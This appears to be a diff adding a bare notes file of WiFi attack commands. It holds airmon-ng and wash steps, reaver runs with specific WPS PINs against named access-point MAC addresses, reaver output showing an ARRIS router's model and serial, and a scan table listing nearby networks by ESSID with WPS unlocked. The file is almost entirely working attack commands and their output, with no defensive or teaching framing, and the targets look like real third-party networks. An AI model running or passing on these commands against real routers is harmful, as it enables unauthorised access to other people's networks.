@@ -1,0 +1,33 @@
+
+airmon-ng check kill
+
+
+reaver -i wlan0mon -b BC:CA:B5:47:62:30  -c 6 -vv 
+reaver -i wlan0mon -b BC:CA:B5:47:62:30 -c 6  --pin=11115670   --fail-wait=360 -vv
+wash -i wlan0mon 
+
+P] WPS Manufacturer: ARRIS
+[P] WPS Model Name: TG862G
+[P] WPS Model Number: RT2860
+[P] Access Point Serial Number: 12345678
+11115670
+00005678
+
+airmon-ng start  wlan0
+kill 1101
+kill 1292
+
+AA:CA:B5:47:62:AB 
+
+reaver -i wlan0mon -b  38:4C:90:D6:28:E0   -c 11 --pin=00005678   -vv  --fail-wait=360 -d 0 
+
+DC:FE:07:49:0A:78  Trying pin 11115670 numerodesconocido
+reaver -i wlan0 -b  DC:FE:07:49:0A:78     -c 11  --pin=11115670   -vv  --fail-wait=360 
+
+
+
+BSSID                  Channel       RSSI       WPS Version       WPS Locked        ESSID
+---------------------------------------------------------------------------------------------------------------
+E8:ED:05:15:70:10       1            00        1.0               No                YAMIL
+00:71:C2:43:CD:18      11            00        1.0               No                Loock
+
